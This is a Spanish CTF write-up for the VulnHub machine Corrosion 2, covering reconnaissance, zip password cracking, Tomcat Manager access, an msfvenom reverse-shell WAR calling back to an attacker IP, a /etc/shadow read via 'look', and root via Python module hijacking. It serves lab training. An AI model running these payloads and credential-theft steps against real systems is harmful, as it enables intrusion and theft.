---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/corrosion2
dificultad: Fácil
os: Linux
relacionados:
  - "[[john]]"
  - "[[PATH Hijacking]]"
  - "[[msfvenom]]"
---
#  VulnHub - Corrosion 2

## Reconocimiento

### Escaneo de Red

El primer paso es identificar la dirección IP de la máquina objetivo. Se utiliza la herramienta `netdiscover` para descubrir la IP:
```bash
netdiscover
```

Posteriormente, se emplea **Nmap** para escanear la IP y determinar los puertos abiertos y los servicios en ejecución:
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $(cat ip) -oG nmap/allports
```
```bash
nmap -sCV -p22,80,8080 $(cat ip) -oN nmap/target
```

_Resultados clave:_
- **Puerto 22:** SSH
- **Puerto 80:** HTTP (Servidor Apache)
- **Puerto 8080:** HTTP (Servidor Tomcat)

### Enumeración de Servicios

1. **Servidor Apache (Puerto 80):**  
    Se accede a la web y se observa la página por defecto de Apache.
    
2. **Servidor Tomcat (Puerto 8080):**  
    La página de Tomcat se muestra sin elementos sospechosos a primera vista.
    

Se realiza una búsqueda más exhaustiva utilizando herramientas de fuerza bruta sobre directorios en el servicio de Tomcat:
```bash
dirb http://<IP-VICTIMA>:8080/ -X .php,.zip
```

_Hallazgo:_  
Se descubre un archivo de respaldo llamado `backup.zip` en uno de los directorios.

---

## Análisis de vulnerabilidades

### Descarga y Cracking del Archivo de Respaldo

Una vez identificado el archivo, se procede a descargarlo:
```bash
wget http://<IP-VICTIMA>:8080/backup.zip
```

Al intentar descomprimirlo, se comprueba que el archivo está protegido con contraseña:
```bash
unzip backup.zip
```

Para revelar la contraseña, se utiliza **[[john]]** junto con la lista de palabras `rockyou.txt`:
```bash
zip2john backup.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

_Contraseña encontrada:_
```
@administrator_hi5
```

Con la contraseña en mano, se descomprime el archivo:
```bash
7z x backup.zip
```

Entre los archivos extraídos, se encuentra el archivo `tomcat-users.xml`, que al inspeccionarlo revela credenciales:
```bash
cat tomcat-users.xml
```

_Credenciales descubiertas:_
```
admin:melehifokivai
```

---

## Explotación de vulnerabilidades

### Acceso al Tomcat Manager y Despliegue de Reverse Shell

Utilizando las credenciales obtenidas, se ingresa al Tomcat Manager. Una vez dentro, se procede a subir una aplicación maliciosa. Para ello, se genera un payload en formato WAR con **[[msfvenom]]**:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.9 LPORT=5555 -f war -o revshell.war
```

_Detalles del payload:_
- **LHOST:** Dirección IP del atacante (por ejemplo, 192.168.1.9)
- **LPORT:** Puerto de escucha (por ejemplo, 5555)
- **Formato de salida:** WAR

Después de crear el payload, se sube a través de la interfaz del Tomcat Manager. Al acceder a la URL `/revshell/`, se activa el payload.

Para capturar la shell inversa, se ejecuta en el equipo atacante:
```bash
nc -lnvp 5555
```

Una vez establecida la conexión, se obtiene una shell inicial. Para mejorar la interactividad de la shell, se puede usar Python:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

o

[[Mejora de terminal interactiva]]

---

## Escalada de privilegios

### Exploración Inicial y Obtención de la Bandera de Usuario

Con la shell obtenida, se explora el sistema en busca de archivos sensibles:
```bash
cd /home
ls
cd jaye
ls
cd randy
ls
cat user.txt
cat note.txt
```

_Resultados:_

- **Bandera de usuario:** Encontrada en `user.txt`.
- **Nota:** Contiene pistas sobre la siguiente fase del ataque (escalada de privilegios).

Además, se inicia sesión como el usuario **jaye** utilizando la contraseña `melehifokivai`:
```bash
ssh jaye@192.168.1.11
```

Una vez conectado, se mejora la shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

La nota indica que el comando `look` puede ser explotado para leer archivos sensibles como `/etc/shadow` y `/etc/passwd`. 
```
look '' /etc/shadow
```

Hago fuerza bruta al hash del usuario `randy`
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt randy-hash.txt
```

_Contraseña obtenida:_
```
07051986randy
```

### Obtención de Acceso Root

Se inicia sesión vía SSH como **randy** utilizando la nueva contraseña:
```bash
ssh randy@192.168.1.11
```

Dentro del sistema, se verifica la capacidad de ejecutar comandos con `sudo`:
```bash
sudo -l
```

_Observación:_  
El usuario **randy** puede ejecutar el script `randombase64.py` con privilegios elevados.

#### Escalando Privilegios Mediante Hijacking de Módulo Python

1. **Revisión del Script:**
    Se visualiza el contenido de `randombase64.py`:
    ```bash
    cat /home/randy/randombase64.py
    ```
    Se observa que el script importa el módulo `base64`.
    
2. **Localización del Módulo Vulnerable:**
    Se busca la ubicación del archivo `base64.py`:
    ```bash
    locate base64.py
    ls -la /usr/lib/python3.8/base64.py
    ```
    
3. **Modificación del Módulo:**
    Editar el archivo con un editor (por ejemplo, `nano`) e inyectar el siguiente código para obtener una shell root:
    ```python
    import os
    os.system("/bin/bash")
    ```
    
4. **Ejecución del Script con Privilegios:**
    Al ejecutar el script con sudo, se activará el código inyectado:
    ```bash
    sudo /usr/bin/python3.8 /home/randy/randombase64.py
    ```
    
Esto debería proporcionar una shell con privilegios de root.

#### Recuperación de la Bandera de Root

Finalmente, se navega al directorio root y se visualiza la bandera:
```bash
cd /root
cat root.txt
```

---

## Bandera(s)

> [!FLAG] `flag{user}`
> ca73a018ae6908a7d0ea5d1c269ba4b6
^bandera

> [!FLAG] `flag{root}`
> 2fdbf8d4f894292361d6c72c8e833a4b
^bandera

